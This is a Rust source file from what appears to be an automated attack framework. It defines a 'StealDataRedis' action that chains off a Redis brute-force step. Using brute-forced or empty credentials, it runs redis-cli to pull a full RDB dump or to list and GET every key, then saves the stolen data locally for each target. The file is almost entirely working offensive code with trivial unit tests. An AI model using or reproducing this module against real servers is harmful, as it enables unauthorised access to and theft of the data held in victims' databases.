use std::sync::Arc;
use std::time::Duration;

use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio::time::timeout;

use crate::actions::{Action, ActionOutcome, Target};
use crate::state::AppState;

use super::{build_output_dir, get_credentials};

/// Steal data from Redis servers by dumping all keys.
/// Parent: RedisBruteforce.
pub struct StealDataRedis;

impl Action for StealDataRedis {
    fn name(&self) -> &'static str {
        "StealDataRedis"
    }
    fn port(&self) -> Option<u16> {
        Some(6379)
    }
    fn parent(&self) -> Option<&'static str> {
        Some("RedisBruteforce")
    }

    fn execute<'a>(
        &'a self,
        target: &'a Target,
        state: &'a Arc<AppState>,
    ) -> std::pin::Pin<Box<dyn std::future::Future<Output = ActionOutcome> + Send + 'a>> {
        Box::pin(run(target, state))
    }
}

async fn run(target: &Target, state: &Arc<AppState>) -> ActionOutcome {
    let creds = get_credentials(state, target.host_id, "redis").await;

    // Redis might be open (no auth) — try with empty creds too
    let mut all_creds = creds;
    if all_creds.is_empty() {
        all_creds.push(("default".to_string(), String::new()));
    }

    let local_dir = build_output_dir(state, "redis", &target.mac_address, &target.ip);
    let _ = tokio::fs::create_dir_all(&local_dir).await;

    for (user, password) in &all_creds {
        if state.shutdown.is_cancelled() {
            break;
        }

        let result = timeout(Duration::from_secs(120), async {
            steal_redis_data(&target.ip, user, password, &local_dir).await
        })
        .await;

        match result {
            Ok(Ok(count)) if count > 0 => {
                tracing::info!(ip = %target.ip, keys = count, "Redis data stolen");
                return ActionOutcome::Success;
            }
            Ok(Err(e)) => tracing::warn!(ip = %target.ip, %e, "Redis steal error"),
            _ => {}
        }
    }

    ActionOutcome::Failed("no data stolen".to_string())
}

async fn steal_redis_data(
    ip: &str,
    user: &str,
    password: &str,
    local_dir: &std::path::Path,
) -> Result<usize, String> {
    // Use redis-cli --rdb to dump the database, or KEYS + GET for simplicity
    let mut args = vec!["-h".to_string(), ip.to_string()];
    if !password.is_empty() {
        if user != "default" && !user.is_empty() {
            args.extend(["--user".to_string(), user.to_string()]);
        }
        args.extend(["-a".to_string(), password.to_string()]);
    }

    // Try RDB dump first
    let rdb_path = local_dir.join("dump.rdb");
    let mut rdb_args = args.clone();
    rdb_args.extend(["--rdb".to_string(), rdb_path.to_string_lossy().to_string()]);

    let rdb_result = tokio::process::Command::new("redis-cli")
        .args(&rdb_args)
        .output()
        .await;

    if matches!(&rdb_result, Ok(o) if o.status.success()) {
        return Ok(1);
    }

    // Fallback: dump keys as text
    let mut keys_args = args.clone();
    keys_args.extend(["KEYS".to_string(), "*".to_string()]);

    let keys_output = tokio::process::Command::new("redis-cli")
        .args(&keys_args)
        .output()
        .await
        .map_err(|e| e.to_string())?;

    if !keys_output.status.success() {
        return Err("failed to list keys".to_string());
    }

    let keys: Vec<String> = String::from_utf8_lossy(&keys_output.stdout)
        .lines()
        .filter(|l| !l.is_empty())
        .map(|s| s.to_string())
        .collect();

    if keys.is_empty() {
        return Ok(0);
    }

    // Dump each key's value
    let dump_path = local_dir.join("keys_dump.txt");
    let mut dump_content = String::new();

    for key in &keys {
        let mut get_args = args.clone();
        get_args.extend(["GET".to_string(), key.clone()]);

        if let Ok(output) = tokio::process::Command::new("redis-cli")
            .args(&get_args)
            .output()
            .await
        {
            let value = String::from_utf8_lossy(&output.stdout);
            dump_content.push_str(&format!("{key} = {value}\n"));
        }
    }

    let _ = tokio::fs::write(&dump_path, &dump_content).await;
    Ok(keys.len())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn action_name() {
        let action = StealDataRedis;
        assert_eq!(action.name(), "StealDataRedis");
    }

    #[test]
    fn action_port() {
        let action = StealDataRedis;
        assert_eq!(action.port(), Some(6379));
    }

    #[test]
    fn action_parent() {
        let action = StealDataRedis;
        assert_eq!(action.parent(), Some("RedisBruteforce"));
    }
}
